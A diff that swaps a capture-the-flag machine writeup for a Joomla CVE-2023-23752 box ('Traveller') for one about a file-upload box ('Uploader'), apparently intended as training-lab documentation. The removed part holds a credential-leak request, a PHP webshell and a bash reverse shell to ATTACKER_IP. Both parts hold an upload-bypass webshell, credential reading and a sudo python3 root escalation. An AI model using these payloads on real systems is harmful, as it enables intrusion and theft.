@@ -1,266 +1,94 @@
-# Traveller — HackTheBox Machine Writeup
+# Uploader
 
-**Machine Name:** Traveller  
-**OS:** Linux (Ubuntu 24.04)  
-**Difficulty:** Easy  
-**CVE:** CVE-2023-23752  
-**Author:** Anonymous0Traveller  
+## Introduction
+I created this machine for students who want to 
+practice server-side vulnerabilities, specifically 
+file upload bypass techniques and basic privilege 
+escalation via sudo misconfiguration.
 
----
-
-## Table of Contents
-1. [Machine Overview](#machine-overview)
-2. [Attack Chain Summary](#attack-chain-summary)
-3. [Credentials](#credentials)
-4. [Service Details](#service-details)
-5. [Full Walkthrough](#full-walkthrough)
-6. [Automation & Cron Jobs](#automation--cron-jobs)
-7. [Firewall Rules](#firewall-rules)
-8. [Important Notes for HTB Staff](#important-notes-for-htb-staff)
-
----
-
-## Machine Overview
-
-Traveller is an Easy-difficulty Linux machine featuring a travel booking website called **WanderNest**, built on **Joomla 4.2.7**. The machine demonstrates the impact of CVE-2023-23752, an unauthenticated information disclosure vulnerability in Joomla's REST API that leaks database credentials. The attack chain progresses from credential exposure to remote code execution and ultimately root access via a sudo misconfiguration.
-
----
-
-## Attack Chain Summary
-
-```
-1. CVE-2023-23752 → Joomla REST API leaks DB credentials (unauthenticated)
-2. MySQL access → Reset Joomla admin password
-3. Joomla Admin Panel → Template edit → PHP Webshell → RCE as www-data
-4. www-data → james (sudo lateral movement)
-5. james → root (sudo python3 GTFOBins privesc)
-```
-
----
 
 ## Credentials
 
-| Account | Username | Password | Notes |
-|---------|----------|----------|-------|
-| Low-priv user | `james` | `manchester1` | SSH access, user.txt owner |
-| Root | `root` | *(sudo from james)* | Via python3 GTFOBins |
-| Joomla DB | `joomlauser` | `Tr@veller2024!` | Leaked via CVE |
-| Joomla Admin | `admin` | `S3cur3Tr@v3l!` | Admin panel access |
-| MySQL Root | `root` | *(no password)* | Local only |
+| User     | Password  | Access        |
+|----------|-----------|---------------|
+| uploader | 01672     | VM Admin      |
+| ayush    | ayush@123 | SSH User      |
+| root     | -         | Via privesc   |
 
-### Flags
-| Flag | Location | Hash |
-|------|----------|------|
-| user.txt | `/home/james/user.txt` | `401d72f78f55e2434aa3368603f5795b` |
-| root.txt | `/root/root.txt` | `e7db925e82055530c1dd9b2769450dc2` |
+### Key Processes
 
----
+**Apache2** runs as `www-data` on port 80, serving a 
+custom PHP photo blog. The upload functionality at 
+/panel/index.php contains intentionally vulnerable 
+file upload code that allows PHP5 extension bypass.
 
-## Service Details
+**OpenSSH** runs on port 22 for remote access.
 
-| Service | Version | Port | Started By |
-|---------|---------|------|------------|
-| Apache2 | 2.4.x | 80 | `apache2.service` (systemd) |
-| MySQL | 8.0.x | 3306 | `mysql.service` (systemd) |
-| OpenSSH | 8.9.x | 22 | `ssh.service` (systemd) |
-| Joomla | 4.2.7 | 80 (via Apache) | Apache VirtualHost |
+Custom source files attached:
+- panel/index.php (vulnerable upload handler)
+- config.php (contains hardcoded credentials)
+### Automation / Crons
 
-**Apache Config:** `/etc/apache2/sites-available/traveller.htb.conf`  
-**Joomla Root:** `/var/www/html/traveller/`  
-**Database Name:** `joomla_db`  
-**DB Table Prefix:** `dsvm6_`
+No cron jobs or scheduled tasks are configured 
+on this machine.
 
----
+### Firewall Rules
 
-## Full Walkthrough
+No custom firewall rules are configured. 
+Default Ubuntu firewall settings apply.
 
-### Step 1 — Reconnaissance
+### Docker
 
-Add machine IP to `/etc/hosts`:
-```bash
-echo "TARGET_IP traveller.htb" >> /etc/hosts
-```
+Docker is not used in this machine.
 
-Nmap scan:
-```bash
-nmap -sC -sV -oN traveller.nmap traveller.htb
-```
+## Walkthrough
 
-Expected output:
-```
-22/tcp  open  ssh     OpenSSH 8.9p1
-80/tcp  open  http    Apache httpd 2.4.x
-```
+### Enumeration
 
----
+#### STEP:- 1 Nmap Scan
+nmap -sV -sC {MACHINE_IP}
 
-### Step 2 — Web Enumeration
+Open ports:
+- Port 22: SSH (OpenSSH 9.6p1)
+- Port 80: HTTP (Apache 2.4.58)
 
-Browse to `http://traveller.htb` — WanderNest travel booking site is presented.
+#### STEP 2:- Web Enumeration
+Check {MACHINE_IP} in browser then you get uploader.htb so you have to 
+add this MACHINE_IP and url in /etc/hosts 
 
-Check Joomla version:
-```bash
-curl http://traveller.htb/administrator/manifests/files/joomla.xml
-```
+using nano /etc/hosts
 
-Version **4.2.7** is confirmed — vulnerable to CVE-2023-23752.
+then you see web blogs and go to upload section 
 
-Directory busting:
-```bash
-gobuster dir -u http://traveller.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
+### Foothold
 
----
+#### STEP 3:- File Upload Bypass
+The upload form blocks .php files but does not block 
+.php5 extension. By also spoofing the MIME type to 
+image/jpeg, the filter is bypassed.
 
-### Step 3 — CVE-2023-23752 Exploitation
+Create webshell:
+echo '<?php system($_GET["cmd"]); ?>' > shell.php5
 
-Joomla 4.0.0–4.2.7 exposes sensitive configuration data via an unauthenticated REST API endpoint.
+Upload with spoofed MIME:
+curl -X POST http://uploader.htb/panel/index.php \
+  -F "file=@shell.php5;type=image/jpeg"
 
-```bash
-curl "http://traveller.htb/api/index.php/v1/config/application?public=true" | python3 -m json.tool
-```
+#### STEP 5:- RCE
+curl "http://uploader.htb/uploads/shell.php5?cmd=id"
+Output: uid=33(www-data)
 
-Leaked credentials from response:
-```json
-"user": "joomlauser"
-"password": "Tr@veller2024!"
-"db": "joomla_db"
-"host": "localhost"
-```
+#### STEP 6:- Credential Discovery
+curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
+Output: ayush : ayush@123
 
----
+### STEP 7:- Lateral Movement
+ssh ayush@{MACHINE_IP}
+cat /home/ayush/user.txt
 
-### Step 4 — MySQL Access & Admin Password Reset
-
-```bash
-mysql -h traveller.htb -u joomlauser -p'Tr@veller2024!' joomla_db
-```
-
-```sql
--- View admin user
-SELECT id, username, password FROM dsvm6_users WHERE username='admin';
-
--- Reset admin password to 'password'
-UPDATE dsvm6_users 
-SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' 
-WHERE username='admin';
-
-EXIT;
-```
-
----
-
-### Step 5 — Joomla Admin Panel → RCE
-
-Login to `http://traveller.htb/administrator`:
-- Username: `admin`
-- Password: `password`
-
-Navigate to:
-```
-System → Templates → Site Templates → Cassiopeia → error.php
-```
-
-Insert webshell at the top of `error.php`:
-```php
-<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>
-```
-
-Verify RCE:
-```bash
-curl "http://traveller.htb/templates/cassiopeia/error.php?cmd=id"
-# uid=33(www-data) gid=33(www-data)
-```
-
----
-
-### Step 6 — Reverse Shell
-
-Start listener on attacker machine:
-```bash
-nc -lvnp 4444
-```
-
-Trigger reverse shell:
-```bash
-curl "http://traveller.htb/templates/cassiopeia/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
-```
-
-Shell received:
-```
-www-data@traveller:/var/www/html/traveller$
-```
-
----
-
-### Step 7 — Lateral Movement (www-data → james)
-
-```bash
-sudo -u james /bin/bash
-james@traveller:/$ cat ~/user.txt
-401d72f78f55e2434aa3368603f5795b
-```
-
----
-
-### Step 8 — Privilege Escalation (james → root)
-
-Check sudo permissions:
-```bash
+### STEP 8:- Privilege Escalation
 sudo -l
-# (ALL) NOPASSWD: /usr/bin/python3
-```
+Output: (ALL) NOPASSWD: /usr/bin/python3
 
-GTFOBins python3 privesc:
-```bash
 sudo python3 -c 'import os; os.system("/bin/bash")'
-root@traveller:/# cat /root/root.txt
-e7db925e82055530c1dd9b2769450dc2
-```
-
-**Machine Pwned!** 🎉
-
----
-
-## Automation & Cron Jobs
-
-No cron jobs are configured on this machine. All services are started via systemd at boot:
-
-```bash
-systemctl is-enabled apache2   # enabled
-systemctl is-enabled mysql     # enabled
-systemctl is-enabled ssh       # enabled
-```
-
----
-
-## Firewall Rules
-
-No custom firewall rules (ufw/iptables) are configured beyond Ubuntu defaults.
-
-```bash
-sudo ufw status
-# Status: inactive
-```
-
----
-
-## Important Notes for HTB Staff
-
-> ⚠️ **DO NOT update Joomla.** The exploit path relies on Joomla version 4.2.7 being installed. Updating Joomla will patch CVE-2023-23752 and break the intended exploitation path.
-
-> ⚠️ **DO NOT update the `sudo` package** if it affects the sudo policy parsing behavior.
-
-> ℹ️ The webshell is intentionally placed in `/var/www/html/traveller/templates/cassiopeia/error.php` as part of the intended RCE path via Joomla template editing.
-
-> ℹ️ MySQL is configured to allow remote connections from any host (`bind-address = 0.0.0.0`) to enable the DB credential exploitation step.
-
----
-
-## LinPEAS / Priv Check Notes
-
-LinPEAS was run to verify no unintentional privilege escalation paths exist beyond the intended sudo python3 vector. No additional SUID binaries, writable cron jobs, or vulnerable kernel versions were found.
-
----
-
-*Documentation written manually. No AI tools were used to generate this writeup.*
+cat /root/root.txt
